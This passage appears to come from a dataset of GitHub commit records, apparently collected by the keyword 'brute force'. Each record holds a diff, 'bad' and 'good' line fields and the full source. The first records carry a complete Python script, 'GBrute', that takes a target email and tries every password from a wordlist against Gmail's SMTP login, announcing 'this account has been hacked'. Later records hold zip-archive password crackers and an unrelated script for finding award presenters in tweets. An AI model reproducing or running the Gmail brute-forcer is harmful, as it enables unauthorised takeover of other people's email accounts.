'[2] exit' option=input('==>') if option==1: file_path=raw_input('enter the path of passwords file:') else: system('clear') exit() pass_file=open(file_path,'r') pass_list=pass_file.readlines() def login(): i=0 user_name=raw_input('enter the target email:') server=smtplib.SMTP_SSL('smtp.gmail.com', 465) server.ehlo() for password in pass_list: i=i +1 print str(i) +'\/' +str(len(pass_list)) try: server.login(user_name, password) system('clear') main() print '\\n' print '[+] this account has been hacked, password:' +password +' ^_^' break except smtplib.SMTPAuthenticationError as e: error=str(e) if error[14]=='<': system('clear') main() print '[+] this account has been hacked, password:' +password +' ^_^' break else: print '[!] password not found=> ' +password login() ","sourceWithComments":"#!\/usr\/bin\/python\n'''coded by John Ry '''\n\nimport smtplib\nfrom os import system\n\ndef main():\n   print '================================================='\n   print '   coded by John Ry                              '\n   print '   creator by John Ry                            '\n   print '   HACKER : John Ry                              '\n   print '   HACKER : CONSTANTINE                          '\n   print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '\n   print '================================================='\n   print '               ++++++++++++++++++++              '\n   print '\\n                                               '\n   print '  _,.                                            '\n   print '                                                 '\n   print '                                                 '\n   print '                                                 '\n   print '       _,.                   '\n   print '     ,` -.)                  '\n   print '    ( _\/-\\\\-._               '\n   print '   \/,|`--._,-^|            , '\n   print '   \\_| |`-._\/||          , | '\n   print '     |  `-, \/ |         \/  \/ '\n   print '     |     || |        \/  \/  '\n   print '      `r-._||\/   __   \/  \/   '\n   print '  __,-<_     )`-\/  `.\/  \/    '\n   print '  \\   `---    \\   \/ \/  \/     '\n   print '     |           |.\/  \/      '\n   print '     \/           \/\/  \/       '\n   print ' \\_\/  \\         |\/  \/        '\n   print '  |    |   _,^- \/  \/         '\n   print '  |    , ``  (\\\/  \/_         '\n   print '   \\,.->._    \\X-=\/^         '\n   print '   (  \/   `-._\/\/^`           '\n   print '    `Y-.____(__}             '\n   print '     |     {__)              ' \n   print '           ()                '\n\nmain()\nprint '[1] start the brute force attack'\nprint '[2] exit'\noption = input('==>')\nif option == 1:\n   file_path = raw_input('enter the path of passwords file :')\nelse:\n   system('clear')\n   exit()\npass_file = open(file_path,'r')\npass_list = pass_file.readlines()\ndef login():\n    i = 0\n    user_name = raw_input('enter the target email :')\n    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)\n    server.ehlo()\n    for password in pass_list:\n      i = i + 1\n      print str(i) + '\/' + str(len(pass_list))\n      try:\n         server.login(user_name, password)\n         system('clear')\n         main()\n         print '\\n'\n         print '[+] this account has been hacked, password :' + password + '     ^_^'\n         break\n      except smtplib.SMTPAuthenticationError as e:\n         error = str(e)\n         if error[14] == '<':\n            system('clear')\n            main()\n            print '[+] this account has been hacked, password :' + password + '     ^_^'\n\n            break\n         else:\n            print '[!] password not found => ' + password\nlogin()\n"}},"msg":"Update brute_force.py"},"bdfc0597344f099800fab12ab93cc28611ef828a":{"url":"https:\/\/api.github.com\/repos\/Commaders\/GBrute\/commits\/bdfc0597344f099800fab12ab93cc28611ef828a","html_url":"https:\/\/github.com\/Commaders\/GBrute\/commit\/bdfc0597344f099800fab12ab93cc28611ef828a","message":"Update brute_force.py","sha":"bdfc0597344f099800fab12ab93cc28611ef828a","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 8abea1e..bfde0fa 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -10,7 +10,7 @@ def main():\n    print '   creator by John Ry                            '\n    print '   HACKER : John Ry                              '\n    print '   HACKER : CONSTANTINE                          '\n-   print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '\n+   print '   Metaverse:https:\/\/www.facebook.com\/DEAUTH3R  '\n    print '================================================='\n    print '               ++++++++++++++++++++              '\n    print '                                                 '\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n    print '   creator by John Ry                            '\n    print '   HACKER : John Ry                              '\n    print '   HACKER : CONSTANTINE                          '\n-   print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '\n+   print '   Metaverse:https:\/\/www.facebook.com\/DEAUTH3R  '\n    print '================================================='\n    print '               ++++++++++++++++++++              '\n    print '                                                 '\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["   print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '"],"goodparts":["   print '   Metaverse:https:\/\/www.facebook.com\/DEAUTH3R  '"]}],"source":"\n '''coded by John Ry ''' import smtplib from os import system def main(): print '=================================================' print ' coded by John Ry ' print ' creator by John Ry ' print ' HACKER: John Ry ' print ' HACKER: CONSTANTINE ' print ' Metaverse:https:\/\/www.facebook.com\/AriAkashi ' print '=================================================' print ' ++++++++++++++++++++ ' print ' ' print ' ' print ' ' print ' ' print ' ' print ' _,. ' print ' ,` -.) ' print ' ( _\/-\\\\-._ ' print ' \/,|`--._,-^| , ' print ' \\_| |`-._\/|| , | ' print ' | `-, \/ | \/ \/ ' print ' | || | \/ \/ ' print ' `r-._||\/ __ \/ \/ ' print ' __,-<_ )`-\/ `.\/ \/ ' print ' \\ `--- \\ \/ \/ \/ ' print ' | |.\/ \/ ' print ' \/ \/\/ \/ ' print ' \\_\/ \\ |\/ \/ ' print ' | | _,^-\/ \/ ' print ' | , `` (\\\/ \/_ ' print ' \\,.->._ \\X-=\/^ ' print ' ( \/ `-._\/\/^` ' print ' `Y-.____(__} ' print ' | {__) ' print ' () ' main() print '[1] start the brute force attack' print '[2] exit' option=input('==>') if option==1: file_path=raw_input('enter the path of passwords file:') else: system('clear') exit() pass_file=open(file_path,'r') pass_list=pass_file.readlines() def login(): i=0 user_name=raw_input('enter the target email:') server=smtplib.SMTP_SSL('smtp.gmail.com', 465) server.ehlo() for password in pass_list: i=i +1 print str(i) +'\/' +str(len(pass_list)) try: server.login(user_name, password) system('clear') main() print '\\n' print '[+] this account has been hacked, password:' +password +' ^_^' break except smtplib.SMTPAuthenticationError as e: error=str(e) if error[14]=='<': system('clear') main() print '[+] this account has been hacked, password:' +password +' ^_^' break else: print '[!] password not found=> ' +password login() ","sourceWithComments":"#!\/usr\/bin\/python\n'''coded by John Ry '''\n\nimport smtplib\nfrom os import system\n\ndef main():\n   print '================================================='\n   print '   coded by John Ry                              '\n   print '   creator by John Ry                            '\n   print '   HACKER : John Ry                              '\n   print '   HACKER : CONSTANTINE                          '\n   print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '\n   print '================================================='\n   print '               ++++++++++++++++++++              '\n   print '                                                 '\n   print '                                                 '\n   print '                                                 '\n   print '                                                 '\n   print '                                                 '\n   print '       _,.                   '\n   print '     ,` -.)                  '\n   print '    ( _\/-\\\\-._               '\n   print '   \/,|`--._,-^|            , '\n   print '   \\_| |`-._\/||          , | '\n   print '     |  `-, \/ |         \/  \/ '\n   print '     |     || |        \/  \/  '\n   print '      `r-._||\/   __   \/  \/   '\n   print '  __,-<_     )`-\/  `.\/  \/    '\n   print '  \\   `---    \\   \/ \/  \/     '\n   print '     |           |.\/  \/      '\n   print '     \/           \/\/  \/       '\n   print ' \\_\/  \\         |\/  \/        '\n   print '  |    |   _,^- \/  \/         '\n   print '  |    , ``  (\\\/  \/_         '\n   print '   \\,.->._    \\X-=\/^         '\n   print '   (  \/   `-._\/\/^`           '\n   print '    `Y-.____(__}             '\n   print '     |     {__)              ' \n   print '           ()                '\n\nmain()\nprint '[1] start the brute force attack'\nprint '[2] exit'\noption = input('==>')\nif option == 1:\n   file_path = raw_input('enter the path of passwords file :')\nelse:\n   system('clear')\n   exit()\npass_file = open(file_path,'r')\npass_list = pass_file.readlines()\ndef login():\n    i = 0\n    user_name = raw_input('enter the target email :')\n    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)\n    server.ehlo()\n    for password in pass_list:\n      i = i + 1\n      print str(i) + '\/' + str(len(pass_list))\n      try:\n         server.login(user_name, password)\n         system('clear')\n         main()\n         print '\\n'\n         print '[+] this account has been hacked, password :' + password + '     ^_^'\n         break\n      except smtplib.SMTPAuthenticationError as e:\n         error = str(e)\n         if error[14] == '<':\n            system('clear')\n            main()\n            print '[+] this account has been hacked, password :' + password + '     ^_^'\n\n            break\n         else:\n            print '[!] password not found => ' + password\nlogin()\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/Errorby-Night\/Personal":{"2d5a641bf8b5dbebdd911192ccc1e5f2f2ca6f4a":{"url":"https:\/\/api.github.com\/repos\/Errorby-Night\/Personal\/commits\/2d5a641bf8b5dbebdd911192ccc1e5f2f2ca6f4a","html_url":"https:\/\/github.com\/Errorby-Night\/Personal\/commit\/2d5a641bf8b5dbebdd911192ccc1e5f2f2ca6f4a","sha":"2d5a641bf8b5dbebdd911192ccc1e5f2f2ca6f4a","keyword":"brute force update","diff":"diff --git a\/Brute Force.py b\/Brute Force.py\nindex c16434c..287589c 100644\n--- a\/Brute Force.py\t\n+++ b\/Brute Force.py\t\n@@ -11,14 +11,14 @@\n         a=[y+i for i in charlist for y in a]\n     complete= complete + a\n \n-z=zipfile.ZipFile('Exercise_2.zip')\n+z=zipfile.ZipFile('<path name>')\n t=0\n \n for password in complete:\n     try:\n         t+=1\n         z.setpassword(password.encode('ascii'))\n-        z.extract('test.txt')\n+        z.extract('<output file name>.txt')\n         print(f'password was found after {t} tries! The password is {password}')\n     except:\n         pass\n","message":"","files":{"\/Brute Force.py":{"changes":[{"diff":"\n         a=[y+i for i in charlist for y in a]\n     complete= complete + a\n \n-z=zipfile.ZipFile('Exercise_2.zip')\n+z=zipfile.ZipFile('<path name>')\n t=0\n \n for password in complete:\n     try:\n         t+=1\n         z.setpassword(password.encode('ascii'))\n-        z.extract('test.txt')\n+        z.extract('<output file name>.txt')\n         print(f'password was found after {t} tries! The password is {password}')\n     except:\n         pass\n","add":2,"remove":2,"filename":"\/Brute Force.py","badparts":["z=zipfile.ZipFile('Exercise_2.zip')","        z.extract('test.txt')"],"goodparts":["z=zipfile.ZipFile('<path name>')","        z.extract('<output file name>.txt')"]}],"source":"\n\nimport zipfile charlist='abcdeffghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@ complete=[] for current in range(4): a=[i for i in charlist] for x in range(current): a=[y+i for i in charlist for y in a] complete=complete +a z=zipfile.ZipFile('Exercise_2.zip') t=0 for password in complete: try: t+=1 z.setpassword(password.encode('ascii')) z.extract('test.txt') print(f'password was found after{t} tries! The password is{password}') except: pass ","sourceWithComments":"#to brute force a zip file\nimport zipfile\n\ncharlist='abcdeffghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+='\ncomplete=[]\n\nfor current in range(4):  #the number in range is to denote the number to characters in the password\n    #the shorter the range the less time required to crack\n    a=[i for i in charlist]\n    for x in range(current):\n        a=[y+i for i in charlist for y in a]\n    complete= complete + a\n\nz=zipfile.ZipFile('Exercise_2.zip')\nt=0\n\nfor password in complete:\n    try:\n        t+=1\n        z.setpassword(password.encode('ascii'))\n        z.extract('test.txt')\n        print(f'password was found after {t} tries! The password is {password}')\n    except:\n        pass\n"}},"msg":"Update Brute Force.py"}},"https:\/\/github.com\/official-hack4peace\/zip-brute-force":{"b4ebab69ab419051ded2aa2e7f298c557650c51e":{"url":"https:\/\/api.github.com\/repos\/official-hack4peace\/zip-brute-force\/commits\/b4ebab69ab419051ded2aa2e7f298c557650c51e","html_url":"https:\/\/github.com\/official-hack4peace\/zip-brute-force\/commit\/b4ebab69ab419051ded2aa2e7f298c557650c51e","sha":"b4ebab69ab419051ded2aa2e7f298c557650c51e","keyword":"brute force update","diff":"diff --git a\/zip-brute-force.py b\/zip-brute-force.py\nindex 3084bff..c1d49d3 100644\n--- a\/zip-brute-force.py\n+++ b\/zip-brute-force.py\n@@ -42,7 +42,7 @@ def crack_password(password_list, obj):\n password_list = (password)\n \n   \n-zip-file = input(\"Enter zip file name: \")\n+zipfile = input(\"Enter zip file name: \")\n zip_file = (zip-file)\n \n   \n","message":"","files":{"\/zip-brute-force.py":{"changes":[{"diff":"\n password_list = (password)\n \n   \n-zip-file = input(\"Enter zip file name: \")\n+zipfile = input(\"Enter zip file name: \")\n zip_file = (zip-file)\n \n   \n","add":1,"remove":1,"filename":"\/zip-brute-force.py","badparts":["zip-file = input(\"Enter zip file name: \")"],"goodparts":["zipfile = input(\"Enter zip file name: \")"]}],"source":"\nimport zipfile def crack_password(password_list, obj): idx=0 with open(password_list, 'rb') as file: for line in file: for word in line.split(): try: idx +=1 obj.extractall(pwd=word) print(\"Password found at line: \", idx) print(\"Password is: \", word.decode()) return True except: continue return False password=input(\"Enter dictionary name: \") password_list=(password) zip-file=input(\"Enter zip file name: \") zip_file=(zip-file) obj=zipfile.ZipFile(zip_file) cnt=len(list(open(password_list, \"rb\"))) print(\"There are total\", cnt, \"number of passwords to test\") if crack_password(password_list, obj)==False: print(\"Error: Password not found\") ","sourceWithComments":"import zipfile \n\n  \n\n  \n\ndef crack_password(password_list, obj): \n\n\n    idx = 0\n\n  \n\n    with open(password_list, 'rb') as file: \n\n        for line in file: \n\n            for word in line.split(): \n\n                try: \n\n                    idx += 1\n\n                    obj.extractall(pwd=word) \n\n                    print(\"Password found at line: \", idx) \n\n                    print(\"Password is: \", word.decode()) \n\n                    return True\n\n                except: \n\n                    continue\n\n    return False\n\n  \n\n  \npassword = input(\"Enter dictionary name: \")\npassword_list = (password)\n\n  \nzip-file = input(\"Enter zip file name: \")\nzip_file = (zip-file)\n\n  \n\nobj = zipfile.ZipFile(zip_file) \n\n  \n\ncnt = len(list(open(password_list, \"rb\"))) \n\n  \n\nprint(\"There are total\", cnt, \n\n      \"number of passwords to test\") \n\n  \n\nif crack_password(password_list, obj) == False: \n\n    print(\"Error: Password not found\")\n"}},"msg":"Update zip-brute-force.py"},"07e2c0bc9d90cdbc488592700d39cd6f36d95420":{"url":"https:\/\/api.github.com\/repos\/official-hack4peace\/zip-brute-force\/commits\/07e2c0bc9d90cdbc488592700d39cd6f36d95420","html_url":"https:\/\/github.com\/official-hack4peace\/zip-brute-force\/commit\/07e2c0bc9d90cdbc488592700d39cd6f36d95420","message":"Update zip-brute-force.py","sha":"07e2c0bc9d90cdbc488592700d39cd6f36d95420","keyword":"brute force update","diff":"diff --git a\/zip-brute-force.py b\/zip-brute-force.py\nindex c1d49d3..2d2fd3b 100644\n--- a\/zip-brute-force.py\n+++ b\/zip-brute-force.py\n@@ -42,8 +42,8 @@ def crack_password(password_list, obj):\n password_list = (password)\n \n   \n-zipfile = input(\"Enter zip file name: \")\n-zip_file = (zip-file)\n+zip = input(\"Enter zip file name: \")\n+zip_file = (zip)\n \n   \n \n","files":{"\/zip-brute-force.py":{"changes":[{"diff":"\n password_list = (password)\n \n   \n-zipfile = input(\"Enter zip file name: \")\n-zip_file = (zip-file)\n+zip = input(\"Enter zip file name: \")\n+zip_file = (zip)\n \n   \n \n","add":2,"remove":2,"filename":"\/zip-brute-force.py","badparts":["zipfile = input(\"Enter zip file name: \")","zip_file = (zip-file)"],"goodparts":["zip = input(\"Enter zip file name: \")","zip_file = (zip)"]}],"source":"\nimport zipfile def crack_password(password_list, obj): idx=0 with open(password_list, 'rb') as file: for line in file: for word in line.split(): try: idx +=1 obj.extractall(pwd=word) print(\"Password found at line: \", idx) print(\"Password is: \", word.decode()) return True except: continue return False password=input(\"Enter dictionary name: \") password_list=(password) zipfile=input(\"Enter zip file name: \") zip_file=(zip-file) obj=zipfile.ZipFile(zip_file) cnt=len(list(open(password_list, \"rb\"))) print(\"There are total\", cnt, \"number of passwords to test\") if crack_password(password_list, obj)==False: print(\"Error: Password not found\") ","sourceWithComments":"import zipfile \n\n  \n\n  \n\ndef crack_password(password_list, obj): \n\n\n    idx = 0\n\n  \n\n    with open(password_list, 'rb') as file: \n\n        for line in file: \n\n            for word in line.split(): \n\n                try: \n\n                    idx += 1\n\n                    obj.extractall(pwd=word) \n\n                    print(\"Password found at line: \", idx) \n\n                    print(\"Password is: \", word.decode()) \n\n                    return True\n\n                except: \n\n                    continue\n\n    return False\n\n  \n\n  \npassword = input(\"Enter dictionary name: \")\npassword_list = (password)\n\n  \nzipfile = input(\"Enter zip file name: \")\nzip_file = (zip-file)\n\n  \n\nobj = zipfile.ZipFile(zip_file) \n\n  \n\ncnt = len(list(open(password_list, \"rb\"))) \n\n  \n\nprint(\"There are total\", cnt, \n\n      \"number of passwords to test\") \n\n  \n\nif crack_password(password_list, obj) == False: \n\n    print(\"Error: Password not found\")\n"}},"msg":"Update zip-brute-force.py"}},"https:\/\/github.com\/latif93\/NLP_Project1":{"014f5c17e992b1d7d781df313d9d394ed6d0c778":{"url":"https:\/\/api.github.com\/repos\/latif93\/NLP_Project1\/commits\/014f5c17e992b1d7d781df313d9d394ed6d0c778","html_url":"https:\/\/github.com\/latif93\/NLP_Project1\/commit\/014f5c17e992b1d7d781df313d9d394ed6d0c778","message":"improved presenter correctness\n\nlowkey brute force but that's alright ig","sha":"014f5c17e992b1d7d781df313d9d394ed6d0c778","keyword":"brute force improve","diff":"diff --git a\/find_presenters.py b\/find_presenters.py\nindex d37c893..a629c26 100644\n--- a\/find_presenters.py\n+++ b\/find_presenters.py\n@@ -1,7 +1,19 @@\n \r\n import re\r\n import json\r\n-import award_hardcoded \r\n+import award_hardcoded\r\n+import sys\r\n+\r\n+# before improvements\r\n+# 'presenters': {'completeness': 0.051923076923076926,\r\n+#                          'spelling': 0.10180995475113122},\r\n+\r\n+# after presents index\r\n+# 'presenters': {'completeness': 0.15, 'spelling': 0.17152149321266966},\r\n+\r\n+# after present index\r\n+# 'presenters': {'completeness': 0.3282051282051282,\r\n+#                          'spelling': 0.4407522624434389},\r\n \r\n def import_json_file(year):\r\n     filename = f\"gg{year}.json\"\r\n@@ -19,21 +31,62 @@ def add_to_freq_dict(item, freq_dict):\n         freq_dict[item] = 1\r\n     else:\r\n         freq_dict[item] +=1\r\n+\r\n def find_potential_presenters(tweets, awards):\r\n     award_to_presenter_dict = dict()\r\n     for award in awards:\r\n         award_to_presenter_dict[award] = dict()\r\n     for tweet in tweets:\r\n-        for award in awards:\r\n-            for keyword in award_hardcoded.get_keywords()[award]:\r\n-                if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword != \"best\":\r\n-                    presenters = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"]) \r\n-                    for presenter in presenters:\r\n-                        if \"best\" not in presenter.lower():\r\n-                            add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+        tweet_lower = tweet['text'].lower()\r\n+\r\n+        # {person} presents {award}\r\n+        presents_index = tweet_lower.find(\"presents\")\r\n+\r\n+        # {multiple people} present {award}\r\n+        present_index = tweet_lower.find(\"present\")\r\n+\r\n+        # {award} presented by {person}\r\n+        presented_by_index = tweet_lower.find(\"presented by\")\r\n+\r\n+        if presents_index != -1:\r\n+            for award in awards:\r\n+                award_keywords = award_hardcoded.get_keywords()[award]\r\n+                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r\n+                    presenter_match = re.search(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][0:presents_index])\r\n+                    if presenter_match:\r\n+                        add_to_freq_dict(presenter_match.group(), award_to_presenter_dict[award])\r\n+\r\n+        if present_index != -1 and presents_index == -1 and presented_by_index == -1:\r\n+            for award in awards:\r\n+                award_keywords = award_hardcoded.get_keywords()[award]\r\n+                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r\n+                    presenters_match = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][0:present_index])\r\n+                    for presenter in presenters_match:\r\n+                        add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+\r\n+        if presented_by_index != -1:\r\n+            for award in awards:\r\n+                award_keywords = award_hardcoded.get_keywords()[award]\r\n+                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r\n+                    presenters_match = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][presented_by_index:])\r\n+                    for presenter in presenters_match:\r\n+                        add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+\r\n+            # for keyword in award_hardcoded.get_keywords()[award]:\r\n+            #     if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword != \"best\":\r\n+            #         presenters = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"])\r\n+            #         for presenter in presenters:\r\n+            #             if \"best\" not in presenter.lower():\r\n+            #                 add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+\r\n+    # for a in award_to_presenter_dict:\r\n+    #     print(\"award: \" + a + \". presenters: \" + str(award_to_presenter_dict[a]))\r\n+    #     print()\r\n+\r\n     for award in award_to_presenter_dict:\r\n         award_to_presenter_dict[award] = sorted(award_to_presenter_dict[award], key = award_to_presenter_dict[award].get)[::-1][:2]\r\n     return award_to_presenter_dict\r\n+\r\n def find_presenters(year, awards):\r\n     tweets = import_json_file(year)\r\n     result = find_potential_presenters(tweets, awards)\r\n","files":{"\/find_presenters.py":{"changes":[{"diff":"\n \r\n import re\r\n import json\r\n-import award_hardcoded \r\n+import award_hardcoded\r\n+import sys\r\n+\r\n+# before improvements\r\n+# 'presenters': {'completeness': 0.051923076923076926,\r\n+#                          'spelling': 0.10180995475113122},\r\n+\r\n+# after presents index\r\n+# 'presenters': {'completeness': 0.15, 'spelling': 0.17152149321266966},\r\n+\r\n+# after present index\r\n+# 'presenters': {'completeness': 0.3282051282051282,\r\n+#                          'spelling': 0.4407522624434389},\r\n \r\n def import_json_file(year):\r\n     filename = f\"gg{year}.json\"\r\n","add":13,"remove":1,"filename":"\/find_presenters.py","badparts":["import award_hardcoded \r"],"goodparts":["import award_hardcoded\r","import sys\r","\r","\r","\r"]},{"diff":"\n         freq_dict[item] = 1\r\n     else:\r\n         freq_dict[item] +=1\r\n+\r\n def find_potential_presenters(tweets, awards):\r\n     award_to_presenter_dict = dict()\r\n     for award in awards:\r\n         award_to_presenter_dict[award] = dict()\r\n     for tweet in tweets:\r\n-        for award in awards:\r\n-            for keyword in award_hardcoded.get_keywords()[award]:\r\n-                if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword != \"best\":\r\n-                    presenters = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"]) \r\n-                    for presenter in presenters:\r\n-                        if \"best\" not in presenter.lower():\r\n-                            add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+        tweet_lower = tweet['text'].lower()\r\n+\r\n+        # {person} presents {award}\r\n+        presents_index = tweet_lower.find(\"presents\")\r\n+\r\n+        # {multiple people} present {award}\r\n+        present_index = tweet_lower.find(\"present\")\r\n+\r\n+        # {award} presented by {person}\r\n+        presented_by_index = tweet_lower.find(\"presented by\")\r\n+\r\n+        if presents_index != -1:\r\n+            for award in awards:\r\n+                award_keywords = award_hardcoded.get_keywords()[award]\r\n+                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r\n+                    presenter_match = re.search(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][0:presents_index])\r\n+                    if presenter_match:\r\n+                        add_to_freq_dict(presenter_match.group(), award_to_presenter_dict[award])\r\n+\r\n+        if present_index != -1 and presents_index == -1 and presented_by_index == -1:\r\n+            for award in awards:\r\n+                award_keywords = award_hardcoded.get_keywords()[award]\r\n+                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r\n+                    presenters_match = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][0:present_index])\r\n+                    for presenter in presenters_match:\r\n+                        add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+\r\n+        if presented_by_index != -1:\r\n+            for award in awards:\r\n+                award_keywords = award_hardcoded.get_keywords()[award]\r\n+                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r\n+                    presenters_match = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][presented_by_index:])\r\n+                    for presenter in presenters_match:\r\n+                        add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+\r\n+            # for keyword in award_hardcoded.get_keywords()[award]:\r\n+            #     if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword != \"best\":\r\n+            #         presenters = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"])\r\n+            #         for presenter in presenters:\r\n+            #             if \"best\" not in presenter.lower():\r\n+            #                 add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n+\r\n+    # for a in award_to_presenter_dict:\r\n+    #     print(\"award: \" + a + \". presenters: \" + str(award_to_presenter_dict[a]))\r\n+    #     print()\r\n+\r\n     for award in award_to_presenter_dict:\r\n         award_to_presenter_dict[award] = sorted(award_to_presenter_dict[award], key = award_to_presenter_dict[award].get)[::-1][:2]\r\n     return award_to_presenter_dict\r\n+\r\n def find_presenters(year, awards):\r\n     tweets = import_json_file(year)\r\n     result = find_potential_presenters(tweets, awards)\r\n","add":48,"remove":7,"filename":"\/find_presenters.py","badparts":["        for award in awards:\r","            for keyword in award_hardcoded.get_keywords()[award]:\r","                if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword != \"best\":\r","                    presenters = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"]) \r","                    for presenter in presenters:\r","                        if \"best\" not in presenter.lower():\r","                            add_to_freq_dict(presenter, award_to_presenter_dict[award])\r"],"goodparts":["\r","        tweet_lower = tweet['text'].lower()\r","\r","        presents_index = tweet_lower.find(\"presents\")\r","\r","        present_index = tweet_lower.find(\"present\")\r","\r","        presented_by_index = tweet_lower.find(\"presented by\")\r","\r","        if presents_index != -1:\r","            for award in awards:\r","                award_keywords = award_hardcoded.get_keywords()[award]\r","                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r","                    presenter_match = re.search(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][0:presents_index])\r","                    if presenter_match:\r","                        add_to_freq_dict(presenter_match.group(), award_to_presenter_dict[award])\r","\r","        if present_index != -1 and presents_index == -1 and presented_by_index == -1:\r","            for award in awards:\r","                award_keywords = award_hardcoded.get_keywords()[award]\r","                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r","                    presenters_match = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][0:present_index])\r","                    for presenter in presenters_match:\r","                        add_to_freq_dict(presenter, award_to_presenter_dict[award])\r","\r","        if presented_by_index != -1:\r","            for award in awards:\r","                award_keywords = award_hardcoded.get_keywords()[award]\r","                if (award.lower() in tweet_lower) or all(word in tweet_lower for word in award_keywords):\r","                    presenters_match = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"][presented_by_index:])\r","                    for presenter in presenters_match:\r","                        add_to_freq_dict(presenter, award_to_presenter_dict[award])\r","\r","\r","\r","\r"]}],"source":"\n\r import re\r import json\r import award_hardcoded \r \r def import_json_file(year):\r filename=f\"gg{year}.json\"\r try:\r file=open(filename)\r tweets=json.load(file)\r file.close()\r return tweets\r except FileNotFoundError:\r print(\"Could not find the file \" +filename)\r sys.exit()\r \r def add_to_freq_dict(item, freq_dict):\r if item not in freq_dict:\r freq_dict[item]=1\r else:\r freq_dict[item] +=1\r def find_potential_presenters(tweets, awards):\r award_to_presenter_dict=dict()\r for award in awards:\r award_to_presenter_dict[award]=dict()\r for tweet in tweets:\r for award in awards:\r for keyword in award_hardcoded.get_keywords()[award]:\r if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword !=\"best\":\r presenters=re.findall(\"[A-Z][a-z]*[A-Z][a-z]*\", tweet[\"text\"]) \r for presenter in presenters:\r if \"best\" not in presenter.lower():\r add_to_freq_dict(presenter, award_to_presenter_dict[award])\r for award in award_to_presenter_dict:\r award_to_presenter_dict[award]=sorted(award_to_presenter_dict[award], key=award_to_presenter_dict[award].get)[::-1][:2]\r return award_to_presenter_dict\r def find_presenters(year, awards):\r tweets=import_json_file(year)\r result=find_potential_presenters(tweets, awards)\r return result\r ","sourceWithComments":"\r\nimport re\r\nimport json\r\nimport award_hardcoded \r\n\r\ndef import_json_file(year):\r\n    filename = f\"gg{year}.json\"\r\n    try:\r\n        file = open(filename)\r\n        tweets = json.load(file)\r\n        file.close()\r\n        return tweets\r\n    except FileNotFoundError:\r\n        print(\"Could not find the file \" + filename)\r\n        sys.exit()\r\n\r\ndef add_to_freq_dict(item, freq_dict):\r\n    if item not in freq_dict:\r\n        freq_dict[item] = 1\r\n    else:\r\n        freq_dict[item] +=1\r\ndef find_potential_presenters(tweets, awards):\r\n    award_to_presenter_dict = dict()\r\n    for award in awards:\r\n        award_to_presenter_dict[award] = dict()\r\n    for tweet in tweets:\r\n        for award in awards:\r\n            for keyword in award_hardcoded.get_keywords()[award]:\r\n                if \"present\" in tweet['text'].lower() and keyword in tweet['text'].lower() and keyword != \"best\":\r\n                    presenters = re.findall(\"[A-Z][a-z]* [A-Z][a-z]*\", tweet[\"text\"]) \r\n                    for presenter in presenters:\r\n                        if \"best\" not in presenter.lower():\r\n                            add_to_freq_dict(presenter, award_to_presenter_dict[award])\r\n    for award in award_to_presenter_dict:\r\n        award_to_presenter_dict[award] = sorted(award_to_presenter_dict[award], key = award_to_presenter_dict[award].get)[::-1][:2]\r\n    return award_to_presenter_dict\r\ndef find_presenters(year, awards):\r\n    tweets = import_json_file(year)\r\n    result = find_potential_presenters(tweets, awards)\r\n    return result\r\n"}},"msg":"improved presenter correctness\n\nlowkey brute force but that's alright 